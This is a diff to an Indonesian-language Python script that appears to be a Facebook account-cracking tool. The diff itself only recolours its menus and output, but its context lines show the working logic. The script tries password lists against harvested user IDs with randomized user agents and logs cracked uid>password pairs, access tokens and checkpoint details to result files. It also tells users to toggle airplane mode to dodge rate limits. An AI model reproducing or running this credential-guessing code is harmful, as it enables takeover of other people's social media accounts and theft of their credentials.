@@ -462,7 +462,7 @@ def user_agent():
 	print(s+"{"+m+"3"+s+"}"+l+" \33[1;96mLihat User Agent")
 	pilih = input("\n"+balmond+l+" +>>> : ")
 	if pilih=="1" or pilih=="01":
-		user = input("\n"+balmond+l+" Masukkan User Agent : "+h+"")
+		user = input("\n"+balmond+l+" \33[1;93mMasukkan User Agent : "+h+"")
 		tulis = open("user.txt","w");tulis.write(user);tulis.close()
 		jalan(balmond+h+" Berhasil")
 		time.sleep(0.5)
@@ -477,7 +477,7 @@ def user_agent():
 		try:
 			user = open("user.txt","r").read()
 		except IOError:
-			jalan("\n"+balmond+m+" File User Agent Tidak Ada, Silahkan Setting Terlebih Dahulu")
+			jalan("\n"+balmond+m+"\33[1;91m File User Agent Tidak Ada, Silahkan Setting Terlebih Dahulu")
 			time.sleep(0.5)
 			menu()
 		print("\n"+balmond+l+" \33[1;96mUser Agent : \33[1;93m"+h+user)
@@ -493,7 +493,7 @@ def dump_old2():
         try:
                 token = open("token.txt","r").read()
         except IOError:
-                jalan(balmond+m+" Token Kadaluarsa")
+                jalan(balmond+m+" \33[1;91mToken Kadaluarsa")
                 time.sleep(0.5)
                 login()
         old_gak.append("old")
@@ -521,7 +521,7 @@ def dump_old2():
                         time.sleep(0.5)
                         exit()
                 except requests.exceptions.ConnectionError:
-                        jalan(balmond+m+" Tidak Ada Internet")
+                        jalan(balmond+m+" \33[1;91mTidak Ada Internet")
                         time.sleep(0.5)
                         exit()
                 try:
@@ -889,12 +889,12 @@ def opsi3():
 # MODE CRACK
 
 def mode_crack():
-	print(s+"\n{"+m+"1"+s+"}"+l+" \33[1;91mMethod Api "+s+"{"+m+"Fast"+s+"}")
-	print(s+"{"+m+"2"+s+"}"+l+" \33[1;92mMethod Mbasic "+s+"{"+m+"Slow"+s+"}")
+	print(s+"\n{"+m+"1"+s+"}"+l+" \33[1;93mMethod Api "+s+"{"+m+"\33[1;96mFast"+s+"}")
+	print(s+"{"+m+"2"+s+"}"+l+" \33[1;93mMethod Mbasic "+s+"{"+m+"\33[1;96mSlow"+s+"}")
 	pilih = input("\n"+balmond+l+" Pilih : ")
 	if pilih=="1" or pilih=="01":
 		print("\n"+balmond+s+" \33[1;93mTekan "+h+"'y'"+s+" \33[1;93mJika Ingin Menggunakan Random User Agent")
-		print(balmond+u+" \33[1;93mTekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
+		print(balmond+u+" \33[1;93mTekan \33[1;97mEnter \33[1;93mJika Tidak Ingin Menggunakan Random User Agent")
 		agenku = input(balmond+l+" \33[1;93mGunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
 		if agenku=="y" or agenku=="Y":
 			random_gak.append("random")
@@ -905,7 +905,7 @@ def mode_crack():
 		default()
 	elif pilih=="2" or pilih=="02":
 		print("\n"+balmond+s+" \33[1;93mTekan "+h+"'y'"+s+" \33[1;93mJika Ingin Menggunakan Random User Agent")
-		print(balmond+u+" \33[1;93mTekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
+		print(balmond+u+" \33[1;93mTekan \33[1;97mEnter \33[1;93mJika Tidak Ingin Menggunakan Random User Agent")
 		agenku = input(balmond+l+" \33[1;93mGunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
 		if agenku=="y" or agenku=="Y":
 			random_gak.append("random")
@@ -927,7 +927,7 @@ def mode_crack2():
         pilih = input("\n"+balmond+l+" \33[1;93m+>>> : ")
         if pilih=="1" or pilih=="01":
                 print("\n"+balmond+s+" \33[1;93mTekan "+h+"'y'"+s+" \33[1;93mJika Ingin Menggunakan Random User Agent")
-                print(balmond+u+" \33[1;93mTekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
+                print(balmond+u+" \33[1;93mTekan \33[1;97mEnter \33[1;93mJika Tidak Ingin Menggunakan Random User Agent")
                 agenku = input(balmond+l+" \33[1;93mGunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                 if agenku=="y" or agenku=="Y":
                         random_gak.append("random")
@@ -938,7 +938,7 @@ def mode_crack2():
                 manual()
         elif pilih=="2" or pilih=="02":
                 print("\n"+balmond+s+" \33[1;93mTekan "+h+"'y'"+s+" \33[1;93mJika Ingin Menggunakan Random User Agent")
-                print(balmond+u+" \33[1;93mTekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
+                print(balmond+u+" \33[1;93mTekan \33[1;97mEnter \33[1;93mJika Tidak Ingin Menggunakan Random User Agent")
                 agenku = input(balmond+l+" \33[1;93mGunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                 if agenku=="y" or agenku=="Y":
                         random_gak.append("random")
@@ -960,7 +960,7 @@ def mode_crack3():
         pilih = input("\n"+balmond+l+" +>>> : ")
         if pilih=="1" or pilih=="01":
                 print("\n"+balmond+s+" \33[1;93mTekan "+h+"'y'"+s+" \33[1;93mJika Ingin Menggunakan Random User Agent")
-                print(balmond+u+" \33[1;93mTekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
+                print(balmond+u+" \33[1;93mTekan \33[1;97mEnter \33[1;93mJika Tidak Ingin Menggunakan Random User Agent")
                 agenku = input(balmond+l+" \33[1;93mGunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                 if agenku=="y" or agenku=="Y":
                         random_gak.append("random")
@@ -971,7 +971,7 @@ def mode_crack3():
                 gabungkan()
         elif pilih=="2" or pilih=="02":
                 print("\n"+balmond+s+" \33[1;93mTekan "+h+"'y'"+s+" \33[1;93mJika Ingin Menggunakan Random User Agent")
-                print(balmond+u+" \33[1;93mTekan Enter Jika Tidak Ingin Menggunakan Random User Agent")
+                print(balmond+u+" \33[1;93mTekan \33[1;97mEnter \33[1;93mJika Tidak Ingin Menggunakan Random User Agent")
                 agenku = input(balmond+l+" \33[1;93mGunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                 if agenku=="y" or agenku=="Y":
                         random_gak.append("random")
@@ -981,7 +981,7 @@ def mode_crack3():
                 print(balmond+l+" \33[1;96mJika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik\n")
                 gabungkan2()
         else:
-                jalan(balmond+l+" Pilihan Invalid")
+                jalan(balmond+l+" \33[1;91mPilihan Invalid")
                 time.sleep(0.5)
                 mode_crack3()
 
@@ -1199,7 +1199,7 @@ def api(uid,pwx,loop):
 					dett = jutt[0]+"."+jitt[0]+"m"
 			elif dutt>0 and dutt<60:
 				dett = ditt[0]+"d"
-	print(s+"\r{"+u+"Chan"+s+"} "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
+	print(s+"\r{"+u+"sanz"+s+"} "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwx:
 		try:
@@ -1221,11 +1221,11 @@ def api(uid,pwx,loop):
 						tahunnya = joined_year[4]
 					elif len(uid)==15:
 						tahunnya = joined_year[5]
-					print(h+"\r{"+k+"ok"+h+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+tahunnya+"          ")
+					print(u+"\rʕ"+h+"ok"+u+"ʔ"+h+" "+uid+u+" >< "+h+pw+u+" >< "+h+tahunnya+"          ")
 					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 					ok.append(uid+"|"+pw)
 				else:
-					print(h+"\r{"+k+"ok"+h+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+response.json()["access_token"])
+					print(u+"\rʕ"+h+"ok"+u+"ʔ"+h+" "+uid+u+" >< "+h+pw+u+" >< "+h+response.json()["access_token"])
 					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 					ok.append(uid+"|"+pw)
 				break
@@ -1253,30 +1253,30 @@ def api(uid,pwx,loop):
 						if len(lahir)==2:
 							nama_bulan = indah[int(lahir[0])]
 							if "old" in old_gak:
-								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
+								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 							else:
-								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
+								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 						else:
 							nama_bulan = indah[int(lahir[0])]
 							if "old" in old_gak:
-								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
+								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 							else:
-								print(a+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
+								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
 								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
 								cp.append(uid+"|"+pw)
 					except (KeyError,IOError):
 						if "old" in old_gak:
-							print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
+							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
 							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 							cp.append(uid+"|"+pw)
 						else:
-							print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+"          ")
+							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+"          ")
 							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
 							cp.append(uid+"|"+pw)
 				elif "munculkan" in opsit:
